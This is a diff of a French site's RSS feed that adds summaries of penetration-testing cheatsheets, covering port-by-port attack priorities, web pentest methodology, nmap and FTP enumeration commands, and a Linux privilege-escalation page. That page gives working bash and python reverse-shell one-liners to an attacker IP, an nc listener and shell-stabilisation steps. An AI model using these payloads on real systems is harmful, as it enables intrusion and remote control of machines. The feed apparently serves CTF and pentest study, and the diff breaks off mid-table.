@@ -2,17 +2,326 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>Shingsi</title>
-    <link>http://localhost:1313/</link>
+    <link>http://localhost:1313/shingsi/</link>
     <description>Recent content on Shingsi</description>
     <generator>Hugo</generator>
-    <language>fr-fr</language>
-    <lastBuildDate>Thu, 02 Apr 2026 10:25:15 +0200</lastBuildDate>
-    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <language>fr</language>
+    <lastBuildDate>Fri, 03 Apr 2026 04:33:34 +0200</lastBuildDate>
+    <atom:link href="http://localhost:1313/shingsi/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Ports</title>
+      <link>http://localhost:1313/shingsi/cheatsheet/ports/</link>
+      <pubDate>Fri, 03 Apr 2026 04:33:34 +0200</pubDate>
+      <guid>http://localhost:1313/shingsi/cheatsheet/ports/</guid>
+      <description>&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;Port&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;Service&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;Description&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;Action Prioritaire (Pentest)&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;21&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;FTP&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Transfert de fichiers (souvent non chiffré).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Tester &lt;code&gt;anonymous&lt;/code&gt; login / Sniffing.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;22&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;SSH&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Accès sécurisé à distance (Ligne de commande).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Bruteforce / Chercher clés privées.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;23&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;Telnet&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Ancêtre du SSH, tout passe en clair.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Sniffer les identifiants sur le réseau.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;25&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;SMTP&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Envoi de courriers électroniques.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Énumérer utilisateurs (&lt;code&gt;VRFY&lt;/code&gt;).&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;53&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;DNS&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Résolution de noms de domaine en IP.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Tester le transfert de zone &lt;code&gt;AXFR&lt;/code&gt;.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;80&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;HTTP&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Protocole web de base (non chiffré).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Fuzzing répertoires / Check versions.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;88&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;Kerberos&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Authentification réseau (Active Directory).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Attaques &lt;code&gt;AS-REP&lt;/code&gt; &amp;amp; &lt;code&gt;Kerberoasting&lt;/code&gt;.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;110&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;POP3&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Récupération de mails (non chiffré).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Bruteforce d&amp;rsquo;identifiants.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;139&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;NetBIOS&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Session de service pour partage de fichiers.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Souvent lié au port 445 (SMB).&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;161&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;SNMP&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Gestion et monitoring d&amp;rsquo;équipements.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Bruteforce &lt;code&gt;Community String&lt;/code&gt;.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;389&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;LDAP&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Annuaire d&amp;rsquo;utilisateurs et d&amp;rsquo;objets.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Énumération d&amp;rsquo;utilisateurs/groupes.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;443&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;HTTPS&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Web sécurisé via SSL/TLS.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Analyse Certificat (Subdomain leak).&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;445&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;SMB&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Partage de fichiers/imprimantes (Windows).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;Null Session&lt;/code&gt; / Partages ouverts.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;1433&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;MSSQL&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Base de données Microsoft SQL Server.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Tester &lt;code&gt;sa&lt;/code&gt; / Injections SQL.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;2049&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;NFS&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Partage de fichiers (Unix/Linux).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Lister les dossiers partagés.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;3306&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Base de données Open Source (Web).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Accès distant sans MDP / SQLi.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;3389&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;RDP&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Bureau à distance Windows (GUI).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Tester &lt;code&gt;BlueKeep&lt;/code&gt; / Bruteforce.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;5432&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;Postgre&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Base de données SQL avancée.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Tester &lt;code&gt;postgres:postgres&lt;/code&gt;.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;5900&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;VNC&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Contrôle de bureau à distance.&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Tester l&amp;rsquo;absence de mot de passe.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;8080&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;HTTP-Alt&lt;/strong&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Port alternatif (Serveurs Web/Admin).&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Chercher Tomcat, Jenkins, APIs.&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;</description>
+    </item>
+    <item>
+      <title>Méthodo Pentestweb</title>
+      <link>http://localhost:1313/shingsi/cheatsheet/pentestweb/</link>
+      <pubDate>Fri, 03 Apr 2026 04:17:21 +0200</pubDate>
+      <guid>http://localhost:1313/shingsi/cheatsheet/pentestweb/</guid>
+      <description>&lt;h2 id=&#34;1-reconnaissance--fingerprinting&#34;&gt;1. Reconnaissance &amp;amp; Fingerprinting&lt;/h2&gt;
+&lt;p&gt;Identifier les technologies pour réduire le périmètre de recherche.&lt;/p&gt;
+&lt;h3 id=&#34;identification-des-technos&#34;&gt;Identification des technos&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Wappalyzer&lt;/strong&gt; (Extension navigateur) : Voir le serveur, le langage (PHP, JS, Python) et le CMS.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;WhatWeb&lt;/strong&gt; : Version ligne de commande.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whatweb &amp;lt;URL&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;fichiers-sensibles&#34;&gt;Fichiers Sensibles&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;/robots.txt&lt;/strong&gt; : Répertoires &amp;ldquo;cachés&amp;rdquo; par l&amp;rsquo;admin.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/sitemap.xml&lt;/strong&gt; : Liste des pages indexées.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/.git&lt;/strong&gt; : Si présent, permet souvent de récupérer tout le code source.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;2-énumération-de-contenu-fuzzing&#34;&gt;2. Énumération de contenu (Fuzzing)&lt;/h2&gt;
+&lt;p&gt;Trouver des pages ou des paramètres que l&amp;rsquo;on ne voit pas à l&amp;rsquo;œil nu.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Protocoles</title>
+      <link>http://localhost:1313/shingsi/cheatsheet/protocoles/</link>
+      <pubDate>Fri, 03 Apr 2026 03:33:13 +0200</pubDate>
+      <guid>http://localhost:1313/shingsi/cheatsheet/protocoles/</guid>
+      <description>&lt;p&gt;Cette cheatsheet regroupe les vecteurs d&amp;rsquo;attaque et commandes d&amp;rsquo;énumération pour les services les plus courants rencontrés en CTF et en environnement réel.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;ftp-21---file-transfer-protocol&#34;&gt;FTP (21) - File Transfer Protocol&lt;/h2&gt;
+&lt;p&gt;Protocole de transfert de fichiers non chiffré. Très courant pour l&amp;rsquo;exfiltration ou la récupération de configurations.&lt;/p&gt;
+&lt;h3 id=&#34;actions-prioritaires&#34;&gt;Actions Prioritaires&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Connexion Anonyme&lt;/strong&gt; : Tester si l&amp;rsquo;utilisateur &lt;code&gt;anonymous&lt;/code&gt; avec un mot de passe vide (ou &lt;code&gt;anonymous&lt;/code&gt;) est accepté.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exploration&lt;/strong&gt; : Lister récursivement tous les fichiers accessibles.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;commandes-utiles&#34;&gt;Commandes Utiles&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Vérification via Nmap&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap --script ftp-anon,ftp-syst -p &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &amp;lt;IP&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Connexion manuelle&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp &amp;lt;IP&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Login: anonymous | Password: (vide)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Lister tout récursivement (une fois connecté)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls -R
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;ssh-22---secure-shell&#34;&gt;SSH (22) - Secure Shell&lt;/h2&gt;
+&lt;p&gt;Accès sécurisé en ligne de commande. Difficile à attaquer directement sauf si des versions obsolètes ou des clés privées sont trouvées.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Privesclinux</title>
+      <link>http://localhost:1313/shingsi/cheatsheet/privesclinux/</link>
+      <pubDate>Fri, 03 Apr 2026 03:31:43 +0200</pubDate>
+      <guid>http://localhost:1313/shingsi/cheatsheet/privesclinux/</guid>
+      <description>&lt;h2 id=&#34;reverse-shells&#34;&gt;Reverse Shells&lt;/h2&gt;
+&lt;h3 id=&#34;listener-machine-attaquante&#34;&gt;Listener (Machine Attaquante)&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nc -lvnp &amp;lt;PORT&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;payloads-machine-victime&#34;&gt;Payloads (Machine Victime)&lt;/h3&gt;
+&lt;p&gt;bash&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;python&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;&amp;lt;IP&amp;gt;&amp;#34;,&amp;lt;PORT&amp;gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;stabilisation-du-shell-tty&#34;&gt;Stabilisation du Shell (TTY)&lt;/h2&gt;
+&lt;p&gt;Indispensable pour avoir l&amp;rsquo;auto-complétion, les flèches et le CTRL+C.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Dans le shell distant :&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Faire &lt;code&gt;CTRL+Z&lt;/code&gt; (met le shell en pause).&lt;/li&gt;
+&lt;li&gt;Dans mon terminal :&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stty raw -echo; fg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;Dans le shell distant (qui revient au premier plan) :&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reset
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;xterm-256color
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export SHELL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;transfert-de-fichiers&#34;&gt;Transfert de fichiers&lt;/h2&gt;
+&lt;p&gt;Pour envoyer des fichiers vers la cible.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Enumeration</title>
+      <link>http://localhost:1313/shingsi/cheatsheet/enumeration/</link>
+      <pubDate>Fri, 03 Apr 2026 01:28:30 +0200</pubDate>
+      <guid>http://localhost:1313/shingsi/cheatsheet/enumeration/</guid>
+      <description>&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h3 id=&#34;tcp-scan&#34;&gt;TCP Scan&lt;/h3&gt;
+&lt;p&gt;Scan complet des services avec scripts par défaut.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sC -sV -p- &amp;lt;IP&amp;gt; -v
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;udp-scan&#34;&gt;UDP Scan&lt;/h3&gt;
+&lt;p&gt;Scan des ports UDP les plus courants (nécessite sudo).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sU -sV -F &amp;lt;IP&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;Attention les scan UDP sont longs&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;options-et-modificateurs&#34;&gt;Options et Modificateurs&lt;/h3&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;Option&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;Fonction&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;Utilité&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-p-&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Tous les ports&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Scanne de 1 à 65535 (indispensable)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-F&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Mode rapide&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Top 100 ports uniquement&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-sC&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Scripts par défaut&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Détecte les vulnérabilités basiques&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-sV&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Versions&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Identifie la version précise du service&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-sU&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Scan UDP&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Pour DNS, SNMP, DHCP, etc.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-Pn&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;No Ping&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Ignore si l&amp;rsquo;hôte répond au ping (pare-feu)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-T4&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Vitesse (0-5)&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;4 est le meilleur compromis rapidité/fiabilité&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-v&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Verbose&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Affiche les ports trouvés en temps réel&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-oN file&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Output&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Sauvegarde le résultat dans un fichier texte&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;-A&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Agressif&lt;/td&gt;
